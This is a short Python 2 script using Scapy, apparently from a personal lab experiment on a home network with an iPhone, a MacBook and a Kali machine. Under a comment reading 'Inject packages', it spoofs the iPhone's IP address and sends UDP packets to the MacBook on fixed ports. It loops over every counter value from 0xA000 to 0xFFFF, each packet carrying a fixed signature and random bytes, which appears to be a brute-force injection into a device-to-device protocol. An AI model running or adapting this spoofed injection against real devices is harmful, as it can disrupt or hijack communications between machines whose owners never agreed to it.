import sys
import binascii
from scapy.all import *
from random import randint
import os


iphone = "192.168.0.102"
kali = "192.168.0.102"
macbook = "192.168.0.105"
work = "192.168.0.102"
iphonePris = "192.168.0.106"
macbookPris = "192.168.0.101"
source = kali
destiny = iphone

sport = 55575
dport = 62867
#payload = "e000880bc7e18545c9075b785fc613c7071f1f4f8dc4eca2f7a9dd27273fb45c612061b3d2be69bfae68791bc697d982af5849045ac0ee41b032fcda73fd5f8fe9ef7cc17829697edc4b6d31f229e9e87244a39453ec11689be38b780bb5bd6d67e30967fea9602ec72df26bbc858a6cc1953a017593c8daa5c3a9"



#Inject packages
start = 0xA000
end = 0xffff
signature = "aaace8c3"
random = "61fb8a4cc18b74638d8e54e68458647344dbb8eaa369fbb6a5cac066a5b3e9ea73dd33fac02e"

for counter in xrange(start, end + 1):
	random = binascii.b2a_hex(os.urandom(randint(75,200)))
	payload = "e000" + format(counter, 'X').lower() + signature + random
	pktToBeSent = IP(src=iphone, dst=macbook)/UDP(sport=sport, dport=dport)/binascii.unhexlify(payload)
	print payload
	send(pktToBeSent)


exit()
